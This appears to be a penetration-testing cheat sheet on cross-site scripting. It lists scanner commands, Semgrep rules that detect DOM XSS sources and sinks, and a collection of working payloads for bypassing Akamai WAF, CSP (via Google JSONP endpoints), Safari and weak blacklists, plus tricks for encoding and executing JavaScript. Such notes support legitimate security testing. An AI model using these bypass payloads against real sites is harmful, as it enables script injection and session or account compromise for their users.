# XSS

```
# https://github.com/hahwul/dalfox
dalfox url http://example.com
cat urls | dalfox pipe -  --skip-bav --skip-mining-all
```

Find reflected parameters that could lead to XSS with Gxss

```
# https://github.com/KathanP19/Gxss
cat list | Gxss -c 100 -p REPLACE_STRING
```

## Semgrep

Semgrep can be used to detect sink and sources and assist in XSS detection.

### Usage

Download javascript files and beautify them (See [Javascript](https://caon.io/docs/exploitation/javascriptfiles/#download)), then run semgrep with

```
semgrep -c xss.yaml scripts/*
```

> **Hold down!**
> 
> Javascript files must be beautified, otherwise semgrep will no work properly.

```yaml
rules:
  - id: domxss-insertAdjacentHTML
    languages:
      - javascript
      - typescript
    message: Found dangerous HTML output
    pattern-either:
      - pattern: document.location.search = ...
      - pattern: document.location.hash = ...
      - pattern: document.location.pathname = ...
      - pattern: window.location.search = ...
      - pattern: window.location.hash = ...
      - pattern: window.location.pathname = ...
      - pattern: document.URL = ...
      - pattern: document.documentURI = ...
      - pattern: document.baseURI = ...
      - pattern: document.cookie = ...
      - pattern: document.referrer = ...
      - pattern: $X.insertAdjacentHTML(...)
      - pattern: $X.innerHTML(...)
      - pattern: $X.innerHTML = ...
      - pattern: eval(...)
      - pattern: execScript
      - pattern: script.src = ...
      - pattern: iframe.src = ...
      - pattern: document.location = ...
      - pattern: window.location = ...
      - pattern: document.location.href = ...
      - pattern: window.location.href = ...
      - pattern: document.write(...)
      - pattern: document.writeln(...)
      - pattern: $X.outerHTML = ...
      - pattern: $X.outerHTML(...)
    severity: WARNING
```

```yaml
rules:
  - id: domxss-insertAdjacentHTML
    languages:
      - javascript
      - typescript
    message: Found dangerous HTML output
    mode: taint
    pattern-sources:
      - pattern: document.location.search
      - pattern: document.location.hash
      - pattern: document.location.pathname
      - pattern: document.location.href
      - pattern: document.location
      - pattern: window.location
      - pattern: window.location.href
      - pattern: window.location.search
      - pattern: window.location.hash
      - pattern: window.location.pathname
      - pattern: document.URL
      - pattern: document.documentURI
      - pattern: document.baseURI
      - pattern: document.cookie
      - pattern: document.referrer
    pattern-sinks:
      - pattern: $X.insertAdjacentHTML(...)
      - pattern: $X.innerHTML(...)
      - pattern: $X.innerHTML = ...
      - pattern: eval(...)
      - pattern: execScript
      - pattern: script.src = ...
      - pattern: iframe.src = ...
      - pattern: document.location = ...
      - pattern: window.location = ...
      - pattern: document.location.href = ...
      - pattern: window.location.href = ...
      - pattern: document.write(...)
      - pattern: document.writeln(...)
      - pattern: $X.outerHTML = ...
      - pattern: $X.outerHTML(...)
    severity: WARNING
```

## Markdown

Markdown parsers can lead to XSS

- [https://swarm.ptsecurity.com/fuzzing-for-xss-via-nested-parsers-condition/](https://swarm.ptsecurity.com/fuzzing-for-xss-via-nested-parsers-condition/)

## Bypasses

Try to encode characters with unicode to achieve WAF bypass

alert(1) would become ale\u{72}t(1\x29, where

\u{72} is unicode to r \x29 is unicode to )

#### Akamai Bypass

Sometimes works:

```
"><a/\test="%26quot"href=%27javascript:/**/;\ale\u{72}t(11111\x29");%27>Click
"><a/\test="%26quot;x%26quot;"href=%27javascript:/**/;location.assign("google.com")%27>Click</a>
```

#### CSP Bypass
###### Common CSP Directives

- `script-src`: allowed origins for scripts
- `style-src`: allowed origins for stylesheets
- `img-src`: allowed origins for images
- `object-src`: allowed origins for objects such as `<object>` or `<embed>`
- `connect-src`: allowed origins for HTTP requests from scripts. For instance using `XMLHttpRequest`
- `default-src`: fallback value if a different directive is not explicitly set. For instance, if the `img-src` is not present in the CSP, the browser will use this value instead for images
- `frame-ancestors`: origins allowed to frame the page, for instance in an `<iframe>`. This can be used to prevent `Clickjacking` attacks
- `form-action`: origins allowed for form submissions

If the site has google whitelisted, the following could be used:

```
www.google.com/complete/search?client=chrome&q=1&jsonp=alert(1)//
accounts.google.com/o/oauth2/revoke?callback=alert(1)
```

#### Safari

```
javascript://trusted.example.com/%0Aalert()
```

#### Weak Blacklists

- Casing: `<ScRiPt>alert(1);</ScRiPt>`
- Casing: `<object data="JaVaScRiPt:alert(1)">`
- Casing: `<img src=x OnErRoR=alert(1)>`
- No Space: `<svg/onload=alert(1)>`

#### JavaScript Encodings

- Unicode: `"\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029"`
- Octal: `"\141\154\145\162\164\50\61\51"`
- Hex: `"\x61\x6c\x65\x72\x74\x28\x31\x29"`
- Base64: `atob("YWxlcnQoMSk=")`

#### String Creation

- fromCharCode: `String.fromCharCode(97,108,101,114,116,40,49,41)`
- source: `/alert(1)/.source`
- URL Encoding: `decodeURI(/alert(%22xss%22)/.source)`

#### Execution Sinks:

- eval: `eval("alert(1)")`
- setTimeout: `setTimeout("alert(1)")`
- setInterval: `setInterval("alert(1)")`
- Function: `Function("alert(1)")()`
- constructor: `[].constructor.constructor(alert(1))()`
# Cool resources

| URL                                                                                                                                                                    | Description          |
| ---------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------- |
| [https://xss.pwnfunction.com/](https://xss.pwnfunction.com/)                                                                                                           | pwnfunction XSS game |
| [https://github.com/s0md3v/MyPapers/tree/master/Bypassing-XSS-detection-mechanisms](https://github.com/s0md3v/MyPapers/tree/master/Bypassing-XSS-detection-mechanisms) | Bypass Mechanisms    |
| [https://htmlparse.hackaplaneten.se/](https://htmlparse.hackaplaneten.se/)                                                                                             | Parser Issues        |